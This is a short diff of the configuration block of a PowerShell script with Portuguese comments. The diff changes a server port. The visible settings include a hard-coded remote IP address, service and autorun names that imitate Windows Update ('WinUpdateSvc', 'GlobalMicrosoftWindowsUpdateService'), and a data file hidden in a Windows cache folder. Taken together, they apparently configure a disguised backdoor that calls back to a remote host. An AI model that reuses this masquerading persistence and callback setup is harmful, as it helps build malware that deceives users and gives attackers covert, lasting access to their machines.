@@ -9,7 +9,7 @@
 
 # ===== CONFIGURACOES =====
 $serverIP = "198.1.195.194"
-$serverPort = 4000
+$serverPort = 5000
 $installName = "WinUpdateSvc"
 $autoName = "GlobalMicrosoftWindowsUpdateService"
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
